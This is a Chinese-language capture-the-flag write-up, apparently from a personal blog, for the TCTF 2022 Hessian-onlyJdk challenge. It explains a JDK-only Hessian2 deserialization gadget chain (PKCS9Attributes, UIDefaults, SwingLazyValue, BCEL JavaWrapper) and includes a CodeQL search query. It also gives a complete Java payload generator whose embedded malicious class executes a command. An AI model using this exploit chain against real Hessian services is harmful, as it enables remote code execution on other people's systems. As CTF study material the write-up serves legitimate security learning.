@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>TCTF2022 Hessian-onlyJdk - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="TCTF2022 Hessian-onlyJdk - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/03/29/TCTF2022%20_%20Hessian-onlyJdk/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-29T13:34:08.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>29,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">TCTF2022 Hessian-onlyJdk</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p><a target="_blank" rel="noopener" href="http://www.bmth666.cn/bmth_blog/2023/02/07/0CTF-TCTF-2022-hessian-onlyJdk/#CVE-2021-43297">http://www.bmth666.cn/bmth_blog&#x2F;2023&#x2F;02&#x2F;07&#x2F;0CTF-TCTF-2022-hessian-onlyJdk&#x2F;#CVE-2021-43297</a><br><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1145">https://goodapple.top/archives/1145</a><br><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1193">https://goodapple.top/archives/1193</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10997#toc-2">https://xz.aliyun.com/t/10997#toc-2</a><br><a target="_blank" rel="noopener" href="https://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/">https://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/</a></p>
+<h1 id="审题"><a href="#审题" class="headerlink" title="审题"></a>审题</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ctf.hessian.onlyJdk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Index</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Index</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;server start&quot;</span>);</span><br><span class="line">        <span class="type">HttpServer</span> <span class="variable">server</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8090</span>), <span class="number">0</span>);</span><br><span class="line">        server.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        server.setExecutor(Executors.newCachedThreadPool());</span><br><span class="line">        server.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">        MyHandler() &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange t)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> <span class="string">&quot;Welcome to 0CTF 2022!&quot;</span>;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> t.getRequestBody();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(is);</span><br><span class="line">                input.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">                var5.printStackTrace();</span><br><span class="line">                response = <span class="string">&quot;oops! something is wrong&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            t.sendResponseHeaders(<span class="number">200</span>, (<span class="type">long</span>)response.length());</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> t.getResponseBody();</span><br><span class="line">            os.write(response.getBytes());</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>很狂的开局，一个文件，明显的反序列化点，简单明了，但是仔细看看发现完全不是maven项目，也没有什么依赖一说，而我们之前解出的Hessian都是有第三方依赖的，那这波肯定是原生JDK打hessian2反序列化了。</p>
+<h1 id="摆烂解题"><a href="#摆烂解题" class="headerlink" title="摆烂解题"></a>摆烂解题</h1><p>题目给了个hint，有一个toString利用链：<a target="_blank" rel="noopener" href="https://x-stream.github.io/CVE-2021-21346.html">https://x-stream.github.io/CVE-2021-21346.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.swing.MultiUIDefaults#toString</span><br><span class="line">	UIDefaults#get</span><br><span class="line">		UIDefaults#getFromHashTable</span><br><span class="line">			UIDefaults$LazyValue#createValue</span><br><span class="line">			SwingLazyValue#createValue</span><br><span class="line">				javax.naming.InitialContext#doLookup()</span><br></pre></td></tr></table></figure>
+<p>给了一条toString的链子，这个出自CVE-2021-21346，一个Xstream的漏洞，既然是toString的链子那么就应该是hessian2的expect抛出异常触发toString了<br>但是用上面的hint打了之后会报错</p>
+<blockquote>
+<ul>
+<li>javax.swing.MultiUIDefaults是package-private类，只能在javax.swing.中使用，而且Hessian2拿到了构造器，但是没有setAccessable，newInstance就没有权限</li>
+<li>所以要找链的话需要类是public的，构造器也是public的，构造器的参数个数不要紧，hessian2会自动挨个测试构造器直到成功</li>
+</ul>
+</blockquote>
+<p>因此需要找一个MultiUIDeafaults的替代类，这里的UIDeafaults是继承Hashtable的，所以需要从toString到HashTable.get（hessian可以反序列化未实现serializable接口的类）<br>大佬们用CODEQL找到了一个适合的类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">@kind path-problem</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line">class ROMethod extends Method&#123;</span><br><span class="line">    ROMethod()&#123;</span><br><span class="line">        this.hasName(&quot;toString&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Source extends Callable &#123;</span><br><span class="line">    Source()&#123;</span><br><span class="line">        (</span><br><span class="line">            this instanceof ROMethod</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetMethod extends Method &#123;</span><br><span class="line">GetMethod()&#123;</span><br><span class="line">        this.hasName(&quot;get&quot;) and</span><br><span class="line">        this.getDeclaringType().getAnAncestor().hasQualifiedName(&quot;java.util&quot;,&quot;Hashtable&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DangerousMethod extends Callable &#123;</span><br><span class="line">    DangerousMethod()&#123;</span><br><span class="line">        this instanceof GetMethod </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CallsDangerousMethod extends Callable &#123;</span><br><span class="line"></span><br><span class="line">    CallsDangerousMethod() &#123;</span><br><span class="line">        exists(Callable a| this.polyCalls(a) and </span><br><span class="line">        a instanceof DangerousMethod )</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">query predicate edges(Method a, Method b) &#123; </span><br><span class="line">    a.polyCalls(b) </span><br><span class="line">    and</span><br><span class="line">    a.getDeclaringType().getAField().getDeclaringType().hasName(b.getDeclaringType().getName())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Source source, CallsDangerousMethod sink</span><br><span class="line">where edges+(source, sink)</span><br><span class="line">select source, source, sink, &quot;$@ $@ to $@ $@&quot; ,</span><br><span class="line">source.getDeclaringType(),source.getDeclaringType().getName(),</span><br><span class="line">source,source.getName(),</span><br><span class="line">sink.getDeclaringType(),sink.getDeclaringType().getName(),</span><br><span class="line">sink,sink.getName() </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>ql代码如上，给以后的自己慢慢啃吧。。codeql真的好强大<br>运行之后可以跑出一个类<code>sun.security.pkcs.PKCS9Attributes</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679409644617-4cb6e571-e6d1-41cc-989c-d88e435af9f6.png#averageHue=%232d2d28&clientId=u2feb1e30-8019-4&from=paste&height=432&id=uad9f7989&name=image.png&originHeight=540&originWidth=1364&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1000217&status=done&style=none&taskId=uaa8ffc6e-3a79-413f-91ca-c0f08cb7e9b&title=&width=1091.2" alt="image.png"><br>在该方法内部调用了<code>getAttribute</code>方法，而这方法里面又调用了get方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679409665703-69ee624a-312f-4c9d-ba8b-14361863a3b4.png#averageHue=%233f453c&clientId=u2feb1e30-8019-4&from=paste&height=97&id=u3904272e&name=image.png&originHeight=121&originWidth=819&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=145341&status=done&style=none&taskId=u3b8aa378-9617-4667-ab36-de63892dd50&title=&width=655.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679409670966-a11f380b-bb43-440e-9869-5cae7dfc5205.png#averageHue=%23434942&clientId=u2feb1e30-8019-4&from=paste&height=80&id=u813cfa2a&name=image.png&originHeight=100&originWidth=751&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=115302&status=done&style=none&taskId=u2a8ba2ed-088d-418e-a6bf-b4af7f4bec9&title=&width=600.8" alt="image.png"><br>并且可以看到这个attributes就是一个HashTable，那么链子就接上了<code>PKCS9Attributes.toString-&gt;HashTable.get-&gt;UIDefault.get-&gt;UIDeafult-&gt;getFromHashTable-&gt;createValue-&gt;xxx.invoke</code><br>这一条链子的重点在<code>SwingLazyValue#createValue</code>中<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679409901263-500b11ee-6d40-43bb-9a29-c33acdd42e62.png#averageHue=%232b2b27&clientId=u2feb1e30-8019-4&from=paste&height=454&id=udfdbe4c8&name=image.png&originHeight=567&originWidth=1605&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1237479&status=done&style=none&taskId=ub3c9bc26-4eaf-4da0-b331-914c173a3da&title=&width=1284" alt="image.png"><br>在这个类中可以触发任意类的任意方法，那么就可以实现RCE（其实并不是任意，需要静态和public这两个条件）<br>最后又是在摆烂中找到了<code>JavaWrapper._main</code>方法，这个方法内部逻辑如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">/* Expects class name as first argument, other arguments are by-passed.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(argv.length == <span class="number">0</span>) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Missing class name.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">class_name</span> <span class="operator">=</span> argv[<span class="number">0</span>];</span><br><span class="line">    String[] new_argv = <span class="keyword">new</span> <span class="title class_">String</span>[argv.length - <span class="number">1</span>];</span><br><span class="line">    System.arraycopy(argv, <span class="number">1</span>, new_argv, <span class="number">0</span>, new_argv.length);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaWrapper</span>();</span><br><span class="line">    wrapper.runMain(class_name, new_argv);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其中主要漏洞逻辑存在于runMain方法中<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679410183145-7dee2b79-fae6-459a-a183-c64db769ea54.png#averageHue=%232b2b27&clientId=u2feb1e30-8019-4&from=paste&height=586&id=u1396c07c&name=image.png&originHeight=733&originWidth=1464&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1440768&status=done&style=none&taskId=u53239130-e27c-4b57-8124-ee7834461d9&title=&width=1171.2" alt="image.png"><br>他会加载一个类，并且找到该类中的_main方法通过invoke去执行它，那么我们只需要创建一个恶意类，其中带一个方法名叫_main然后让他加载那么就可以执行命令了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Hessian2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的shell.class需要有参数，要符合上图中的规则<br>还有一个需要注意的点就是这里的loader我们可以发现是一个bcel<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679410367924-d47e7a96-1954-4209-b11d-77b665529b55.png#averageHue=%232d2d29&clientId=u2feb1e30-8019-4&from=paste&height=467&id=u3a09934e&name=image.png&originHeight=584&originWidth=1345&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1065032&status=done&style=none&taskId=u8273574e-7cf0-4659-a268-3bf7a2dadf3&title=&width=1076" alt="image.png"><br>在初始化JavaWrapper时会对loader进行赋值，赋值为<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>那这里也就涉及一个bcel的类加载问题，这个我在之前的文章中说过了，一个小tips<br>那么payload构造如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attribute;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attributes;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前提条件:CVE-2021-43297,打toString()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_JavaWrapper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">PKCS9Attributes</span> <span class="variable">s</span> <span class="operator">=</span> createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">evil</span> <span class="operator">=</span> Repository.lookupClass(test.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(evil.getBytes(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;payload&#125;&#125;));</span><br><span class="line"></span><br><span class="line">        setFieldValue(s,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        baos.write(<span class="number">67</span>);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject(s);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);</span><br><span class="line">        input.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
